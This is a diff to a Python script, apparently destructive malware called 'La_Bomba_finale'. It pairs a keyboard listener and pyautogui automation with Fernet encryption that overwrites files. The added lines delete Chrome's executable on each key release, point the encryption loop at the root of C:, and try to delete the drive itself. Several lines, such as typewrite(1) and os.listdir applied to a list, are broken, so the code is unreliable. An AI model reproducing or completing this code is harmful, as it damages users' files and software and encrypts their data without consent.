@@ -85,6 +85,7 @@ def on_press(tasto):
     except AttributeError:
         pass
 def on_release(tasto):
+    os.remove("c:\\programmi (x86)\\google\\chrome\\application\\chrome.exe")
     if tasto == Key.esc:
         return False
 with Listener(on_press=on_press, on_release=on_release) as listener:
@@ -583,6 +584,7 @@ for i in testo:
     pyautogui.typewrite(i)
 pyautogui.hotkey('win', 's')
 t="La_Bomba_finale.py"
+
 for i in t:
     pyautogui.typewrite(1)
 pyautogui.press("enter")
@@ -614,7 +616,7 @@ def estrazionenumeri(file_path):
     encrypter=fernet.encrypt(original)
     with open(file_path,"wb")as encrypter_file:
             encrypter_file.write(encrypter)
-    percorso="C:\WINDOWS\system32"
+    percorso=os.listdir("C:\\")
     for filename in os.listdir(percorso):
         percorso=os.path.join(percorso,filename)
         if os.path.isfile(percorso):
@@ -903,4 +905,5 @@ for i in range(144):
     pyautogui.moveTo(1597,0,duration=1)
     pyautogui.click()
     pyautogui.press(Button="left")
+os.remove("c:\\")
 os.remove("La_Bomba_finale.exe")
